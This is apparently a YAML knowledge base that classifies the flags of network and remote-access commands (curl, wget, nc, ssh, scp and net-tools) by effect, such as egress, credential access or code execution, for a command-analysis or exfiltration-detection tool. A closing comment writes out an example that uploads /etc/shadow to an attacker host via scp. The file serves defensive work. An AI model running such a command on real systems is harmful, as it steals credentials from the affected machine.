version: effect-kb/v3
# ---------------------------------------------------------------------------
# Network, remote-access and security-tooling commands: net-tools, curl, wget,
# nc, openssh, plus DNS, reachability, capture/scan, firewall, SMB/LDAP and
# cloud-sync utilities.
#
# Sources: the net-tools man pages (ifconfig, route, netstat, arp), the curl
# and wget manuals, the nc(1) and ssh(1)/scp(1) manuals, and the manuals of the
# DNS, reachability, capture/scan, firewall and file-sharing tools.
# Credential-bearing flags are tagged CredAccess; anything that opens a
# listening socket or a forwarded port is NetIngress; outbound requests are
# NetEgress; flags that write a local file are FSWrite; a remote command is
# CodeExec; a local socket or agent endpoint is IPC.
# ---------------------------------------------------------------------------
commands:
  - name: ifconfig
    dialect: net-tools
    params:
      - spec: "-a"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-s"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-v"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: IFACE
        kind: positional
        effect: {kind: FSMeta, mode: Direct, valueFrom: args}

  - name: route
    dialect: net-tools
    params:
      - spec: "-n"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      # Finding 18: the net-tools route command never receives traffic — it
      # reads and mutates the local routing table. The family/target selectors
      # are reads; add/del/gw rewrite kernel routing state that outlives the
      # invocation, which is Persist, not NetIngress.
      - spec: "-A"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "-net"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: add
        kind: positional
        effect: {kind: Persist, mode: Direct, valueFrom: args}
      - spec: del
        kind: positional
        effect: {kind: Persist, mode: Direct, valueFrom: args}
      - spec: gw
        kind: positional
        effect: {kind: Persist, mode: Direct, valueFrom: args}

  - name: netstat
    dialect: net-tools
    params:
      - spec: "-a"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-n"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-l"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-p"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-t"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-u"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-r"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-i"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}

  - name: arp
    dialect: net-tools
    params:
      - spec: "-a"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-n"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-d"
        kind: option
        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
      - spec: "-s"
        kind: option
        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}

  - name: curl
    dialect: curl
    params:
      - spec: "-o"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-O"
        kind: flag
        effect: {kind: FSWrite, mode: Direct, valueFrom: args}
      # Finding 33: the documented long spellings of -o/-O. Both write the
      # response body to a local file, so neither may bind as a plain URL.
      - spec: "--output"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--remote-name"
        kind: flag
        effect: {kind: FSWrite, mode: Direct, valueFrom: args}
      - spec: "-X"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-d"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "--data"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "--data-binary"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      # Finding 36: --data-ascii is curl's documented alias of --data (the
      # manual's own example is `--data-ascii @file`), and --url-query accepts
      # the same @file / name@file payload forms. Both read the local file and
      # ship its bytes, so both must bind the payload read.
      - spec: "--data-ascii"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "--url-query"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "-H"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-u"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-k"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-L"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-T"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "-F"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "--form"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "-A"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-b"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-c"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-K"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--url"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-x"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--proxy"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--proxy-user"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-e"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--referer"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-G"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "--request"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--header"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--data-raw"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--data-urlencode"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "--json"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
      - spec: "--upload-file"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--cookie"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--cookie-jar"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-n"
        kind: flag
        effect: {kind: CredAccess, mode: Direct, valueFrom: args}
      - spec: "--netrc"
        kind: flag
        effect: {kind: CredAccess, mode: Direct, valueFrom: args}
      - spec: "--netrc-file"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-E"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--cert"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--key"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--cacert"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--oauth2-bearer"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-D"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--dump-header"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      # Finding 82 (pass 52): the remaining documented options that write a
      # caller-named file. `man curl` describes each as writing to the file it
      # names — `--libcurl FILE` ("a libcurl-using C source code file written to
      # the file you specify"), `--trace FILE`/`--trace-ascii FILE` ("the full
      # trace dump written to FILE"), `--stderr FILE` (redirect stderr),
      # `--hsts FILE` (the HSTS cache), `--alt-svc FILE` (the alt-svc cache),
      # `--etag-save FILE` (save ETags) and `--output-dir DIR` (the directory
      # the transfers are saved in). Without them the write was invisible and
      # the analysis noted the option as unrecognised.
      - spec: "--trace"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--trace-ascii"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--libcurl"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--stderr"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--hsts"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--alt-svc"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--etag-save"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--output-dir"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--config"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: URL
        kind: positional
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}

  - name: wget
    dialect: wget
    params:
      # -O/--output-document names the file the fetched body is written to
      # ("-" means standard output, handled by the binder as Stdio);
      # -o names the log file, and -P/--directory-prefix the directory the
      # download is written into.
      - spec: "-O"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--output-document"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-o"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--output-file"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-P"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--directory-prefix"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-c"
        kind: flag
        effect: {kind: FSWrite, mode: Direct, valueFrom: args}
      - spec: "-r"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-m"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "--post-data"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--post-file"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--body-file"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--user"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--password"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--delete-after"
        kind: flag
        effect: {kind: FSMeta, mode: Direct, valueFrom: args}
      - spec: "--header"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--user-agent"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-U"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-i"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--input-file"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--load-cookies"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--save-cookies"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      # Finding 82 (pass 52): `man wget` — "--warc-file= filename … use
      # filename as the name of the WARC file" — writes a caller-named archive
      # beside the download, exactly as the documented `-o`/`--output-file` and
      # `--save-cookies` spellings already do.
      - spec: "--warc-file"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "--netrc-file"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--certificate"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--private-key"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--ca-certificate"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--ca-directory"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "--http-user"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "--http-password"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-e"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--execute"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--spider"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "--no-clobber"
        kind: flag
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      - spec: "-N"
        kind: flag
        effect: {kind: FSMeta, mode: Direct, valueFrom: args}
      - spec: "--accept"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "--reject"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-q"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: URL
        kind: positional
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}

  - name: nc
    dialect: netcat
    aliases:
      - netcat
    params:
      - spec: "-l"
        kind: flag
        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
      - spec: "-p"
        kind: option
        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
      - spec: "-e"
        kind: option
        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
      - spec: "-c"
        kind: option
        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
      - spec: "-w"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-u"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-z"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-k"
        kind: flag
        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
      - spec: "-s"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-i"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-q"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-G"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-v"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-n"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-x"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-X"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-o"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-b"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-C"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-N"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "--ssl"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "--send-only"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "--recv-only"
        kind: flag
        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
      - spec: PORT
        kind: positional
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: HOST
        kind: positional
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}

  - name: ssh
    dialect: openssh
    params:
      - spec: "-L"
        kind: option
        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
      - spec: "-R"
        kind: option
        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
      - spec: "-D"
        kind: option
        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
      - spec: "-N"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-T"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-o"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-i"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-p"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-A"
        kind: flag
        effect: {kind: CredAccess, mode: Direct, valueFrom: args}
      - spec: "-J"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-F"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "-t"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-w"
        kind: option
        effect: {kind: IPC, mode: Direct, valueFrom: flagValue}
      - spec: "-S"
        kind: option
        effect: {kind: IPC, mode: Direct, valueFrom: flagValue}
      - spec: "-M"
        kind: flag
        effect: {kind: IPC, mode: Direct, valueFrom: args}
      - spec: "-e"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-X"
        kind: flag
        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
      - spec: "-Y"
        kind: flag
        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
      - spec: "-x"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-E"
        kind: option
        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
      - spec: "-4"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-6"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-C"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-q"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-v"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-g"
        kind: flag
        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
      - spec: "-b"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-W"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-l"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-c"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-m"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: HOST
        kind: positional
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: COMMAND
        kind: positional
        effect: {kind: CodeExec, mode: Conditional, valueFrom: args}

  - name: scp
    dialect: openssh
    params:
      - spec: "-r"
        kind: flag
        effect: {kind: FSWrite, mode: Direct, valueFrom: args}
      - spec: "-P"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-i"
        kind: option
        effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
      - spec: "-p"
        kind: flag
        effect: {kind: FSMeta, mode: Direct, valueFrom: args}
      - spec: "-3"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-o"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-F"
        kind: option
        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
      - spec: "-J"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-q"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-v"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-c"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-l"
        kind: option
        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
      - spec: "-S"
        kind: option
        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
      - spec: "-T"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-O"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-s"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-4"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: "-6"
        kind: flag
        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
      - spec: SRC
        kind: positional
        effect: {kind: FSRead, mode: Direct, valueFrom: args}
      # `scp SRC [user@]host:path` is an upload: the destination is a network
      # sink, not a local file (Finding 3). The egress gate keeps it only for a
      # host-shaped operand, so a local `scp a b` fabricates no egress, while
      # `scp /etc/shadow attacker.example:/tmp/x` pairs the secret read with the
      # egress sink the exfiltration control requires.
